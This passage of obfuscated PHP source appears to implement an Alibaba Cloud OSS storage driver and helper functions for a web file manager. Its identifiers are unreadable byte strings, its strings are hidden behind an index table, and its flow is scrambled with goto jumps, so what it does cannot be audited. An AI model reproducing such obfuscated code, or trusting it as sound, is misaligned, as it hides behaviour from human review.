$aŠ’âªĞê½, $d½‚äĞ®‡[1175] => $fïñ·½×¾, $d½‚äĞ®‡[1176] => $a¨»…ˆ); try { $D†è—õ¢”¾ = $this->client->listObjects($this->bucket, $fĞ“ÂÓˆàÁ); } catch (OSS\Core\OssException $F¬´¡•½êå) { break; } $a¨»…ˆ = $D†è—õ¢”¾->getNextMarker(); $EŠç—ø—† = $D†è—õ¢”¾->getObjectList(); $CŸ÷åî¥ˆ = $D†è—õ¢”¾->getPrefixList(); if ($eÀœ¸Œ©Á´) { if (count($EŠç—ø—†) > 1 || count($EŠç—ø—†) == 1 && $EŠç—ø—†[0]->getKey() != $aŠ’âªĞê½) { $aºòÚ²À¡ += count($EŠç—ø—†) - 1; } if (!empty($CŸ÷åî¥ˆ)) { $bŒ™•„‡ª¦ += count($CŸ÷åî¥ˆ); } if ($a¨»…ˆ === $d½‚äĞ®‡[33]) { break; } continue; } if ($dÒ·¦âï’) { if (!empty($EŠç—ø—†)) { if (count($EŠç—ø—†) > 1 || $EŠç—ø—†[0]->getKey() != $aŠ’âªĞê½) { return !0; } } } else { if (!empty($CŸ÷åî¥ˆ)) { return !0; } } if ($a¨»…ˆ === $d½‚äĞ®‡[33]) { break; } } if ($eÀœ¸Œ©Á´) { return array($d½‚äĞ®‡[191] => $aºòÚ²À¡, $d½‚äĞ®‡[192] => $bŒ™•„‡ª¦); } goto d¨„«Ï²×’; dŒ­ù˜«™ë: $a¨»…ˆ = $d½‚äĞ®‡[33]; $fïñ·½×¾ = 500; $aºòÚ²À¡ = 0; goto aÕ¼•Ä‰…²; d¨„«Ï²×’: return !1; goto D£ã·ô†Å÷; B¼ˆÖ¬­ÛÊ: $d½‚äĞ®‡ =& $_SERVER[Î¿—”òá]; $dáÊä¥¼Åõ = trim($dáÊä¥¼Åõ, $d½‚äĞ®‡[8]); $aŠ’âªĞê½ = empty($dáÊä¥¼Åõ) ? $d½‚äĞ®‡[33] : $dáÊä¥¼Åõ . $d½‚äĞ®‡[8]; goto dŒ­ù˜«™ë; D£ã·ô†Å÷: } public function listAll($a·æ¹ˆğÃ) { $F˜œó®‘° =& $_SERVER[Î¿—”òá]; $c¦ØÒÂ†‹Ê = $this->fileList($a·æ¹ˆğÃ, $F˜œó®‘°[33], !0); $e¢»•âê‡Ô = array(); foreach ($c¦ØÒÂ†‹Ê[$F˜œó®‘°[73]] as $d©ª—Œƒ¥ø) { $e¢»•âê‡Ô[$d©ª—Œƒ¥ø[$F˜œó®‘°[28]]] = $d©ª—Œƒ¥ø[$F˜œó®‘°[77]]; } return $this->listAllFiles($a·æ¹ˆğÃ, array_keys($e¢»•âê‡Ô), $e¢»•âê‡Ô); } public function canRead($BÅéÏ»‡Å) { $Cä½ùâ–§ =& $_SERVER[Î¿—”òá]; $cÙ¤»îâªÍ = $this->pathAcl($BÅéÏ»‡Å); return $cÙ¤»îâªÍ == $Cä½ùâ–§[1187] || $cÙ¤»îâªÍ == $Cä½ùâ–§[491] ? !0 : !1; } public function canWrite($fÕŠÈ‚ï´ó) { $Bö¤¿áœº¼ = $this->pathAcl($fÕŠÈ‚ï´ó); return $Bö¤¿áœº¼ == $_SERVER[Î¿—”òá][491] ? !0 : !1; } public function pathAcl($BÁôµ»ƒ×) { goto còÁõ Ç‚‘; bßä¥ŸÙ¢: return $Cƒ¥«å½‡; goto a®÷ëø‡ä‡; còÁõ Ç‚‘: $Eˆí¹â½£ =& $_SERVER[Î¿—”òá]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fÑéÉ£¢¡ª = $this->client->getObjectAcl($this->bucket, $this->pathEncode($BÁôµ»ƒ×)); } catch (OSS\Core\OssException $fæ­Â®Õßø) { return !1; } goto Bñò§ö Ÿ; Bñò§ö Ÿ: $Cƒ¥«å½‡ = $fÑéÉ£¢¡ª == $Eˆí¹â½£[34] ? $this->bucketAcl : $fÑéÉ£¢¡ª; if ($Cƒ¥«å½‡ == $Eˆí¹â½£[1188]) { return $Eˆí¹â½£[1187]; } if ($Cƒ¥«å½‡ == $Eˆí¹â½£[1189]) { return $Eˆí¹â½£[491]; } goto bßä¥ŸÙ¢; a®÷ëø‡ä‡: } private function chmodPath($A³÷ùø¹î›, $Cé…®ù••ğ = '') { $b“› â§ò =& $_SERVER[Î¿—”òá]; $Eîãã©Ğó‰ = empty($Cé…®ù••ğ) ? $b“› â§ò[1189] : $Cé…®ù••ğ; $B¦¡Ü¡™… = array($b“› â§ò[34], $b“› â§ò[185], $b“› â§ò[1188], $b“› â§ò[1189]); if (!in_array($Eîãã©Ğó‰, $B¦¡Ü¡™…)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($A³÷ùø¹î›), $Eîãã©Ğó‰); } catch (OSS\Core\OssException $aì†Ùİ¥¼¡) { return !1; } return !0; } public function getContent($D³«Û¼§Æİ) { return $this->fileSubstr($D³«Û¼§Æİ, -1); } public function setContent($b‘¯Ó±Â‘, $fÌƒöñŸó› = '') { $Bß¯Ö¯ÃÏ† =& $_SERVER[Î¿—”òá]; try { $bƒ¸À´ëÑá = $this->trafficLimit($Bß¯Ö¯ÃÏ†[1190]); $EôÄÎô±´ = $this->client->putObject($this->bucket, $this->pathEncode($b‘¯Ó±Â‘), $fÌƒöñŸó›, $bƒ¸À´ëÑá); } catch (OSS\Core\OssException $A¢î¶ÃÛ‡ñ) { return !1; } $C§Ïù¸¶®— = array($Bß¯Ö¯ÃÏ†[1177] => trim($EôÄÎô±´[$Bß¯Ö¯ÃÏ†[1191]], $Bß¯Ö¯ÃÏ†[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b‘¯Ó±Â‘))); $this->updateObjMeta($b‘¯Ó±Â‘, $C§Ïù¸¶®—); return isset($EôÄÎô±´[$Bß¯Ö¯ÃÏ†[1192]][$Bß¯Ö¯ÃÏ†[1139]]) ? (int) $EôÄÎô±´[$Bß¯Ö¯ÃÏ†[1192]][$Bß¯Ö¯ÃÏ†[1139]] : strlen($EôÄÎô±´); } private function updateObjMeta($Dã¹ÂÖã², $dà­Ö¨Æï«) { $Dã¹ÂÖã² = $this->pathEncode($Dã¹ÂÖã²); try { $AóÜĞÈ¯Î‘ = array(OSS\OssClient::OSS_HEADERS => $dà­Ö¨Æï«); $this->client->copyObject($this->bucket, $Dã¹ÂÖã², $this->bucket, $Dã¹ÂÖã², $AóÜĞÈ¯Î‘); } catch (OSS\Core\OssException $C†šÀ„ùñ‰) { return !1; } return !0; } public function upload($Cßµ¼ÔÊ¡, $fñ±ì¨ˆÖ¤, $AÅÃ§‚âŒÃ = false, $EÕ”¡æÅËÙ = REPEAT_REPLACE) { $D¡”¡èêŠ¯ =& $_SERVER[Î¿—”òá]; $DôğíÄĞ = trim($Cßµ¼ÔÊ¡, $D¡”¡èêŠ¯[8]); $F¥Û»Ã‚¥ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($D¡”¡èêŠ¯[1177] => @md5_file($fñ±ì¨ˆÖ¤)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Cßµ¼ÔÊ¡))); $F¥Û»Ã‚¥ = $this->trafficLimit($D¡”¡èêŠ¯[1190], $F¥Û»Ã‚¥); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($DôğíÄĞ), $fñ±ì¨ˆÖ¤, $F¥Û»Ã‚¥); } catch (OSS\Core\OssException $b±Â¿¡¤Ÿ‘) { return !1; } return $this->getPathOuter($Cßµ¼ÔÊ¡); } public function getHost() { $DÏ³îø¹®° =& $_SERVER[Î¿—”òá]; $eæçğéµŒè = explode($DÏ³îø¹®°[171], parent::getHost()); return $eæçğéµŒè[0] . $DÏ³îø¹®°[171] . $this->bucket . $DÏ³îø¹®°[91] . $eæçğéµŒè[1]; } public function uploadFormData($Dù…ñÀ±ëĞ, $D¡‰¤‡±¯¶ = 3600) { goto cáÀ¶˜“…; F½å³®‚: $CØçÀÓ®÷ = $this->pathFather($Dù…ñÀ±ëĞ); $fŞØ°¶Ù˜Ä = array($C«ŠÌŞé‚„[1095] => $e”Õ´ÄŒæ, $C«ŠÌŞé‚„[1096] => array(array($C«ŠÌŞé‚„[1195], 0, $B„‚Í®„íƒ), array($C«ŠÌŞé‚„[1099], $C«ŠÌŞé‚„[1100], $CØçÀÓ®÷))); $fĞº£Ú¯• = base64_encode(json_encode($fŞØ°¶Ù˜Ä)); goto E‚Î„Åùªë; cáÀ¶˜“…: $C«ŠÌŞé‚„ =& $_SERVER[Î¿—”òá]; if (!($CÀØÛºÁÓ = $this->getHost())) { return !1; } $f„’áÜñã½ = $D¡‰¤‡±¯¶; goto fóæ×Ø‹; E‚Î„Åùªë: $e‰‡•¹ÇŒì = base64_encode(hash_hmac($C«ŠÌŞé‚„[218], $fĞº£Ú¯•, $this->secret, !0)); $fß“ê´£’Ø = array($C«ŠÌŞé‚„[1105] => $fĞº£Ú¯•, $C«ŠÌŞé‚„[1196] => $this->accessKey, $C«ŠÌŞé‚„[1101] => $C«ŠÌŞé‚„[1093], $C«ŠÌŞé‚„[1197] => $e‰‡•¹ÇŒì, $C«ŠÌŞé‚„[169] => $CÀØÛºÁÓ); $fß“ê´£’Ø = $this->trafficLimit($C«ŠÌŞé‚„[1190], $fß“ê´£’Ø); goto dæÄåßİø; fÃ –‚¢ª: $FÀËÂ¬¢¶ = strpos($e”Õ´ÄŒæ, $C«ŠÌŞé‚„[284]); $e”Õ´ÄŒæ = substr($e”Õ´ÄŒæ, 0, $FÀËÂ¬¢¶) . $C«ŠÌŞé‚„[1194]; $B„‚Í®„íƒ = 1048576000 * 5; goto F½å³®‚; dæÄåßİø: return $fß“ê´£’Ø; goto a¨«îÔŸ±; fóæ×Ø‹: $Cô†ÇçÉìŒ = date($C«ŠÌŞé‚„[1193], time() + $f„’áÜñã½); $bÑ¹œË• = new DateTime($Cô†ÇçÉìŒ); $e”Õ´ÄŒæ = $bÑ¹œË•->format(DateTime::ISO8601); goto fÃ –‚¢ª; a¨«îÔŸ±: } public function multiUploadFormData($C‡ÈÀ½©, $C¾ŸîÈ‘Û = 3600) { $f²¤İÙÏÒï =& $_SERVER[Î¿—”òá]; if (!($Bï„ƒòÄª = $this->getHost())) { return !1; } $CÚùòŒ²Å» = $this->trafficLimit($f²¤İÙÏÒï[1190]); $e‘Éá«ºÓ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($C‡ÈÀ½©), $CÚùòŒ²Å»); return array($f²¤İÙÏÒï[209] => $e‘Éá«ºÓ, $f²¤İÙÏÒï[169] => $Bï„ƒòÄª . $f²¤İÙÏÒï[8] . $this->pathEncode($C‡ÈÀ½©), $f²¤İÙÏÒï[210] => gmdate($f²¤İÙÏÒï[1198]), $f²¤İÙÏÒï[89] => $C‡ÈÀ½©); } public function multiUploadAuthData($CÇŒÈä¯·Æ, $F®–¶•¼º = array()) { goto D‹ÃíÆÔÍÍ; b¢Û¢Èò: $c½ÉéÏåÙ = $CÇŒÈä¯·Æ; if (isset($F®–¶•¼º[$Bƒé×•Ÿîğ[89]])) { $c½ÉéÏåÙ = $F®–¶•¼º[$Bƒé×•Ÿîğ[89]]; unset($F®–¶•¼º[$Bƒé×•Ÿîğ[89]]); } if (isset($F®–¶•¼º[$Bƒé×•Ÿîğ[211]])) { $F®–¶•¼º[$Bƒé×•Ÿîğ[210]] = $e¶îî¿Ò—˜; return $this->listUploadParts($c½ÉéÏåÙ, $F®–¶•¼º); } goto fğÚÚâÒ’¿; D‹ÃíÆÔÍÍ: $Bƒé×•Ÿîğ =& $_SERVER[Î¿—”òá]; $e¶îî¿Ò—˜ = isset($F®–¶•¼º[$Bƒé×•Ÿîğ[210]]) ? $F®–¶•¼º[$Bƒé×•Ÿîğ[210]] : gmdate($Bƒé×•Ÿîğ[1198]); $eÂ íòÃ£„ = isset($F®–¶•¼º[$Bƒé×•Ÿîğ[160]]) ? $F®–¶•¼º[$Bƒé×•Ÿîğ[160]] : $Bƒé×•Ÿîğ[33]; goto b¢Û¢Èò; Bã¡î±“Ï: if (!empty($F®–¶•¼º[$Bƒé×•Ÿîğ[1200]])) { $fèñè®ª³› = array_merge(array($eê”š™‚ÜÒ[4]), $F®–¶•¼º[$Bƒé×•Ÿîğ[1200]]); sort($fèñè®ª³›); $eê”š™‚ÜÒ[4] = implode($Bƒé×•Ÿîğ[217], $fèñè®ª³›); } $fÕà‘ÚŠ¥š = implode($Bƒé×•Ÿîğ[217], $eê”š™‚ÜÒ); $aË¶ìÏ›²è = base64_encode(hash_hmac($Bƒé×•Ÿîğ[218], $fÕà‘ÚŠ¥š, $this->secret, !0)); goto d±™«ÓŠõ; fğÚÚâÒ’¿: $eê”š™‚ÜÒ = array($Bƒé×•Ÿîğ[212], $Bƒé×•Ÿîğ[33], $Bƒé×•Ÿîğ[116], $e¶îî¿Ò—˜, "\x78\55\157\x73\x73\x2d\x64\141\164\x65\x3a{$e¶îî¿Ò—˜}", $Bƒé×•Ÿîğ[8] . $this->bucket . $Bƒé×•Ÿîğ[8] . $c½ÉéÏåÙ . $eÂ íòÃ£„); if (strpos($eÂ íòÃ£„, $Bƒé×•Ÿîğ[213]) === 0) { $eê”š™‚ÜÒ[0] = $Bƒé×•Ÿîğ[214]; if ($D£Çœİ·® = $this->trafficLimit($Bƒé×•Ÿîğ[1190])) { $c½ÉéÏåÙ = $Bƒé×•Ÿîğ[1199]; array_splice($eê”š™‚ÜÒ, 5, 0, $c½ÉéÏåÙ . $Bƒé×•Ÿîğ[4] . $D£Çœİ·®[$c½ÉéÏåÙ]); } } if (isset($F®–¶•¼º[$Bƒé×•Ÿîğ[215]]) && $F®–¶•¼º[$Bƒé×•Ÿîğ[215]] == $Bƒé×•Ÿîğ[216]) { $eê”š™‚ÜÒ[0] = $Bƒé×•Ÿîğ[216]; } goto Bã¡î±“Ï; d±™«ÓŠõ: $CŒÚì—ÀìÍ = $Bƒé×•Ÿîğ[1201] . $this->accessKey . $Bƒé×•Ÿîğ[4] . $aË¶ìÏ›²è; if (strpos($eÂ íòÃ£„, $Bƒé×•Ÿîğ[213]) === 0) { $CŒÚì—ÀìÍ = array($Bƒé×•Ÿîğ[220] => $CŒÚì—ÀìÍ, $Bƒé×•Ÿîğ[210] => $e¶îî¿Ò—˜); if ($D£Çœİ·®) { $CŒÚì—ÀìÍ = array_merge($CŒÚì—ÀìÍ, $D£Çœİ·®); } } return $CŒÚì—ÀìÍ; goto cŠèŸæğ—´; cŠèŸæğ—´: } public function listUploadParts($FÔÀˆôØñ, $bÆ§Š» É™) { goto fÇë†ªİ; D›÷ÇğîÆ: unset($bÆ§Š» É™[$F©ï…ë²È[211]], $bÆ§Š» É™[$F©ï…ë²È[215]]); $c„ÕøŠ¿Û = $this->multiUploadAuthData($FÔÀˆôØñ, $bÆ§Š» É™); if (empty($c„ÕøŠ¿Û)) { return !1; } goto A¨„Ì¤ÇËæ; fÇë†ªİ: $F©ï…ë²È =& $_SERVER[Î¿—”òá]; $d¯ÁƒƒÄ·— = parse_url_query($bÆ§Š» É™[$F©ï…ë²È[160]]); $BùêÖŞ‘ = $this->client->listParts($this->bucket, $this->pathEncode($FÔÀˆôØñ), $d¯ÁƒƒÄ·—[$F©ï…ë²È[209]]); goto dÌëç““ç; dÌëç““ç: $BĞµù¹Œ¦÷ = $BùêÖŞ‘->getListPart(); $c¢ÛÆ¼å¤ó = array(); foreach ($BĞµù¹Œ¦÷ as $cˆÅƒã´·) { $c¢ÛÆ¼å¤ó[] = array($F©ï…ë²È[1181] => $cˆÅƒã´·->getPartNumber(), $F©ï…ë²È[1182] => trim($cˆÅƒã´·->getETag(), $F©ï…ë²È[113])); } goto D›÷ÇğîÆ; A¨„Ì¤ÇËæ: return array($F©ï…ë²È[220] => $c„ÕøŠ¿Û, $F©ï…ë²È[210] => $bÆ§Š» É™[$F©ï…ë²È[210]], $F©ï…ë²È[222] => $c¢ÛÆ¼å¤ó); goto féáÉä¼Áç; féáÉä¼Áç: } public function download($CÖÔ±ªÅÄÄ, $cÃĞŠ‰·…) { if ($this->isFolder($CÖÔ±ªÅÄÄ)) { return !1; } try { $f”ÖÚßÍ­½ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $cÃĞŠ‰·…); $f”ÖÚßÍ­½ = $this->trafficLimit($_SERVER[Î¿—”òá][105], $f”ÖÚßÍ­½); $this->client->getObject($this->bucket, $this->pathEncode($CÖÔ±ªÅÄÄ), $f”ÖÚßÍ­½); } catch (OSS\Core\OssException $e×âÇ÷‘) { return !1; } return $cÃĞŠ‰·…; } public function fileSubstr($Bé¨…µê®, $DãÙ§ö”ö = 0, $CÏ—º¾Èª = false) { if ($DãÙ§ö”ö === -1) { $f™Óéªç„ = array(); } else { if ($CÏ—º¾Èª === !1) { $c¼ ©½ƒ²ß = $this->size($Bé¨…µê®); } else { $c¼ ©½ƒ²ß = $DãÙ§ö”ö + $CÏ—º¾Èª - 1; } $f™Óéªç„ = array(OSS\OssClient::OSS_RANGE => "{$DãÙ§ö”ö}\x2d{$c¼ ©½ƒ²ß}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Bé¨…µê®), $f™Óéªç„); } catch (OSS\Core\OssException $c“Ó÷âô­¸) { think_exception($c“Ó÷âô­¸->getMessage()); return !1; } } private function trafficLimit($d»­åº…¬Ş, $b‰¶Ü°öĞ = array()) { goto FóÑ†¹’¿; eôš ÌÑˆË: return $b‰¶Ü°öĞ; goto A†·¢¡Ñ’; FóÑ†¹’¿: $AÏß…Û„Âà =& $_SERVER[Î¿—”òá]; if ($d»­åº…¬Ş == $AÏß…Û„Âà[1190] && $this->isUploadServer() || $d»­åº…¬Ş == $AÏß…Û„Âà[105] && $this->isFileOutServer()) { return $b‰¶Ü°öĞ; } $a„´­°‡¦… = floatval($GLOBALS[$AÏß…Û„Âà[6]][$AÏß…Û„Âà[84]][$AÏß…Û„Âà[103]][$d»­åº…¬Ş]) * 1024 * 1024 * 8; goto c”ê˜„áÌ; c”ê˜„áÌ: if (!$a„´­°‡¦…) { return $b‰¶Ü°öĞ; } $a„´­°‡¦… = $a„´­°‡¦… < 819200 ? 819200 : ($a„´­°‡¦… > 838860800 ? 838860800 : $a„´­°‡¦…); $b‰¶Ü°öĞ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a„´­°‡¦…); goto eôš ÌÑˆË; A†·¢¡Ñ’: } public function link($a‡Ë¦»ÏÖ•, $e¯Ë…Å™ = array()) { $f¬±Î»­‡© =& $_SERVER[Î¿—”òá]; if (!$this->exist($a‡Ë¦»ÏÖ•) || $this->isFolder($a‡Ë¦»ÏÖ•)) { return !1; } try { $e¯Ë…Å™ = $this->trafficLimit($f¬±Î»­‡©[105], $e¯Ë…Å™); $e³’ÌÏ¸À“ = $this->client->signUrl($this->bucket, $this->pathEncode($a‡Ë¦»ÏÖ•), 3600 * 12, $f¬±Î»­‡©[216], $e¯Ë…Å™); return $this->getCdnLink($e³’ÌÏ¸À“); } catch (OSS\Core\OssException $a‚«®Ì«„¤) { return !1; } } public function fileOut($C¡ßØÍ¬ƒ, $A×çÚÄôÂä = false, $E±¶¶âßˆ… = false, $e˜…Ã»ĞŒ = '') { goto cŠ‡‚Ë”­; A²æ“èïõ: $Fã¶ÅÃ‚æÎ = get_file_mime(get_path_ext($E±¶¶âßˆ…)); if ($Fã¶ÅÃ‚æÎ == $d–½Ä•ëÔ¯[201]) { return parent::fileOut($C¡ßØÍ¬ƒ, $A×çÚÄôÂä, $E±¶¶âßˆ…, $e˜…Ã»ĞŒ); } $A×çÚÄôÂä = $A×çÚÄôÂä ? $d–½Ä•ëÔ¯[202] : $d–½Ä•ëÔ¯[203]; goto c²­æÚíùÃ; cŠ‡‚Ë”­: $d–½Ä•ëÔ¯ =& $_SERVER[Î¿—”òá]; if (!$E±¶¶âßˆ…) { $E±¶¶âßˆ… = $this->pathThis($C¡ßØÍ¬ƒ); } $E±¶¶âßˆ… = rawurlencode($E±¶¶âßˆ…); goto A²æ“èïõ; c²­æÚíùÃ: $Dä¾„ÚöÒ = array(OSS\OssClient::OSS_SUB_RESOURCE => $d–½Ä•ëÔ¯[1202] . rawurlencode("{$A×çÚÄôÂä}\73\x66\x69\154\145\156\x61\155\x65\75{$E±¶¶âßˆ…}")); $Dä¾„ÚöÒ[OSS\OssClient::OSS_SUB_RESOURCE] .= $d–½Ä•ëÔ¯[1203] . rawurlencode($Fã¶ÅÃ‚æÎ); $Eóİ×““á‘ = $this->link($C¡ßØÍ¬ƒ, $Dä¾„ÚöÒ); goto dÜ¥ºÅ‰«Ó; dÜ¥ºÅ‰«Ó: $this->fileOutLink($Eóİ×““á‘); goto f‡™¿İ¦œ; f‡™¿İ¦œ: } public function fileOutServer($EÏÙõ…š¥¸, $dÔãÜ“Ğ¶á = false, $CñÁáæğ‚… = false, $E×¤¿Ú®¦À = '') { parent::fileOut($EÏÙõ…š¥¸, $dÔãÜ“Ğ¶á, $CñÁáæğ‚…, $E×¤¿Ú®¦À); } public function fileOutImage($E’½…Ø‹”¯, $d¯È‚Ë¥åÕ = 250) { $a­Û…½×÷ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Î¿—”òá][1204] . $d¯È‚Ë¥åÕ); $Fœ±Êà¶ = $this->link($E’½…Ø‹”¯, $a­Û…½×÷); $this->fileOutLink($Fœ±Êà¶); } public function fileOutImageServer($c©ø·ïõ…, $e½•‘¹ä = 250) { parent::fileOutImage($c©ø·ïõ…, $e½•‘¹ä); } public function fileOutLink($A¥İ¹—Ë”¨) { $dºçŒ‚ÚÌä =& $_SERVER[Î¿—”òá]; if (!$this->isCdnHost() && substr($A¥İ¹—Ë”¨, 0, 7) == $dºçŒ‚ÚÌä[1108]) { $A¥İ¹—Ë”¨ = $dºçŒ‚ÚÌä[1109] . substr($A¥İ¹—Ë”¨, 7); } header($dºçŒ‚ÚÌä[156] . $A¥İ¹—Ë”¨); die; } public function hashMd5($EÜ¸èÃ¯”Â, $e¹“÷ã§ÌÊ = '') { $fÂöˆ·á¤ =& $_SERVER[Î¿—”òá]; $b®´ŞÅ„ê‹ = $this->objectMeta($EÜ¸èÃ¯”Â); if (!$b®´ŞÅ„ê‹) { return $fÂöˆ·á¤[33]; } if (!isset($b®´ŞÅ„ê‹[$fÂöˆ·á¤[1177]]) && !empty($e¹“÷ã§ÌÊ)) { $f®¨¶ÕóÚ = $this->updateObjMeta($EÜ¸èÃ¯”Â, array($fÂöˆ·á¤[1177] => $e¹“÷ã§ÌÊ)); $b®´ŞÅ„ê‹[$fÂöˆ·á¤[1177]] = $f®¨¶ÕóÚ ? $e¹“÷ã§ÌÊ : $fÂöˆ·á¤[33]; } return isset($b®´ŞÅ„ê‹[$fÂöˆ·á¤[1177]]) ? strtolower($b®´ŞÅ„ê‹[$fÂöˆ·á¤[1177]]) : $fÂöˆ·á¤[33]; } public function size($cƒ®³Ìçï¿) { $AóÏÜ¥ñ­Í = $this->objectMeta($cƒ®³Ìçï¿); return $AóÏÜ¥ñ­Í ? $AóÏÜ¥ñ­Í[$_SERVER[Î¿—”òá][77]] : 0; } public function info($A±ø¾ïÛñ) { if ($this->isFolder($A±ø¾ïÛñ)) { return $this->folderInfo($A±ø¾ïÛñ); } else { if ($this->isFile($A±ø¾ïÛñ)) { return $this->fileInfo($A±ø¾ïÛñ); } } return !1; } public function exist($BØ„¥‘§İô) { return $this->isFile($BØ„¥‘§İô) || $this->isFolder($BØ„¥‘§İô); } public function isFile($DÄË‰‘˜ÊÊ) { return !$this->isFolder($DÄË‰‘˜ÊÊ) && $this->objectMeta($DÄË‰‘˜ÊÊ); } public function isFolder($a‘™‘µºŠË) { return $this->cacheMethod($_SERVER[Î¿—”òá][223], $a‘™‘µºŠË); } protected function objectMeta($aàİÈá²é) { return $this->cacheMethod($_SERVER[Î¿—”òá][224], $aàİÈá²é); } protected function _objectMeta($Aæš•·²Ñ) { $b¨½°‡ °Á =& $_SERVER[Î¿—”òá]; try { $Aä¹›İ˜ö = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Aæš•·²Ñ)); } catch (OSS\Core\OssException $B¹Î‘º…Š) { $Aä¹›İ˜ö = !1; } if ($Aä¹›İ˜ö) { $Aä¹›İ˜ö[$b¨½°‡ °Á[77]] = intval($Aä¹›İ˜ö[$b¨½°‡ °Á[1184]]); } return $Aä¹›İ˜ö; } protected function _isFolder($AœÀÍØ’ÀŠ) { $b‘³ôÒËÕù =& $_SERVER[Î¿—”òá]; if ($AœÀÍØ’ÀŠ == $b‘³ôÒËÕù[33] || $AœÀÍØ’ÀŠ == $b‘³ôÒËÕù[8]) { return !0; } $e‡ìì”¤Ò = array($b‘³ôÒËÕù[1174] => $b‘³ôÒËÕù[8], $b‘³ôÒËÕù[186] => rtrim($AœÀÍØ’ÀŠ, $b‘³ôÒËÕù[8]) . $b‘³ôÒËÕù[8], $b‘³ôÒËÕù[1175] => 1, $b‘³ôÒËÕù[1176] => $b‘³ôÒËÕù[33]); $c¸ŠÎŠœ²µ = $this->client->listObjects($this->bucket, $e‡ìì”¤Ò); if ($c¸ŠÎŠœ²µ->getObjectList() || $c¸ŠÎŠœ²µ->getPrefixList()) { return !0; } return !1; } } goto F¥ø·¤¨È•; Eº÷Î‚¹Á: function ActionCall($F„Ø«¾£æ÷) { $F¨íª’—£ï = array_slice(func_get_args(), 1); return ActionApply($F„Ø«¾£æ÷, $F¨íª’—£ï); } function ActionCallApi($cÏ¿®‡å©, $EïÅùÑ”Îæ = '') { goto FäÅÀ¶Ëİ; D‘À¦Ğ•æØ: $dê¼É÷êîˆ = Action($C…¿Ù¶èà[23])->accessToken(); $cÏ¿®‡å© = str_replace($C…¿Ù¶èà[5], $C…¿Ù¶èà[4], $cÏ¿®‡å©) . $C…¿Ù¶èà[24] . $dê¼É÷êîˆ . $a ”ò‚ë¤Ì; $cÔ’©Ğ¿™Ğ = $C…¿Ù¶èà[20]; goto dÆ„òÜçÑ‹; dÆ„òÜçÑ‹: $BáëÌ–§Äø = phpBinCommand(); if ($BáëÌ–§Äø && function_exists($C…¿Ù¶èà[25])) { $FÔßÆ½µ°ä = $BáëÌ–§Äø . $C…¿Ù¶èà[26] . BASIC_PATH . $C…¿Ù¶èà[27] . escapeshellarg($cÏ¿®‡å©); $cÔ’©Ğ¿™Ğ = shell_exec($FÔßÆ½µ°ä); } if (!$cÔ’©Ğ¿™Ğ) { $döÅ¯Ÿ™¨ƒ = stream_context_create(array($C…¿Ù¶èà[28] => array($C…¿Ù¶èà[29] => 20, $C…¿Ù¶èà[30] => $C…¿Ù¶èà[31]))); $cÔ’©Ğ¿™Ğ = file_get_contents(APP_HOST . $C…¿Ù¶èà[32] . $cÏ¿®‡å©, !1, $döÅ¯Ÿ™¨ƒ); } goto c‘¯ŒÎñö; FäÅÀ¶Ëİ: $C…¿Ù¶èà =& $_SERVER[‡•˜°©ˆ]; $a ”ò‚ë¤Ì = $EïÅùÑ”Îæ; if (is_array($EïÅùÑ”Îæ)) { $a ”ò‚ë¤Ì = $C…¿Ù¶èà[20]; foreach ($EïÅùÑ”Îæ as $F—ƒ½äÂÂº => $aÓÀçµ‘Ë) { $aÓÀçµ‘Ë = is_array($aÓÀçµ‘Ë) ? json_encode($aÓÀçµ‘Ë) : $aÓÀçµ‘Ë; $aÓÀçµ‘Ë = is_bool($aÓÀçµ‘Ë) ? intval($aÓÀçµ‘Ë) : $aÓÀçµ‘Ë; $a ”ò‚ë¤Ì .= $C…¿Ù¶èà[21] . $F—ƒ½äÂÂº . $C…¿Ù¶èà[22] . rawurlencode($aÓÀçµ‘Ë); } } goto D‘À¦Ğ•æØ; c‘¯ŒÎñö: $d©µè ¦Òç = json_decode($cÔ’©Ğ¿™Ğ, !0); $Aˆ™¿™Š† = is_array($d©µè ¦Òç) ? $d©µè ¦Òç : array($C…¿Ù¶èà[33] => null, $C…¿Ù¶èà[34] => $cÔ’©Ğ¿™Ğ); if (!$d©µè ¦Òç) { echo $cÔ’©Ğ¿™Ğ; } goto B·«»¢Á¨˜; B·«»¢Á¨˜: return $Aˆ™¿™Š†; goto bâñ£òê•£; bâñ£òê•£: } function ActionCallHook($BÔ¶Ÿù–ë) { goto cİÈÎøƒá; F§ê¶Ì¾©Ï: $GLOBALS[$CËò‡¥ÇáŒ[35]] = 1; $Fô…¬£­ƒù = ActionApply($BÔ¶Ÿù–ë, $E¾º÷‚Œœ‹); $bÊáğëùÄ = ob_get_clean(); goto f˜àÏ¸æ‰; f˜àÏ¸æ‰: $Fô…¬£­ƒù = $bÊáğëùÄ ? json_decode($bÊáğëùÄ, !0) : $Fô…¬£­ƒù; $GLOBALS[$CËò‡¥ÇáŒ[35]] = 0; return $Fô…¬£­ƒù; goto dâ’è÷«ö–; cİÈÎøƒá: $CËò‡¥ÇáŒ =& $_SERVER[‡•˜°©ˆ]; ob_start(); $E¾º÷‚Œœ‹ = array_slice(func_get_args(), 1); goto F§ê¶Ì¾©Ï; dâ’è÷«ö–: } goto d§À”†Ù¢; FÉ¬È¾ÛÈ³: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\142\x61\143\x6b\165\160\114\x69\x73\164"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\163\164\x61\x74\165\x73", "\143\x6f\156\164\x65\x6e\x74", "\x72\x65\x73\x75\x6c\164", "\164\x69\155\145\106\x72\157\155", "\x74\151\x6d\x65\x54\x6f"); public function config() { goto F“îÇËƒµÉ; C‘ªõğ¶é: Action($BÍ¯­¸†©Ä[2119])->taskInit(); $e«ÆÆŒÀÖÔ = 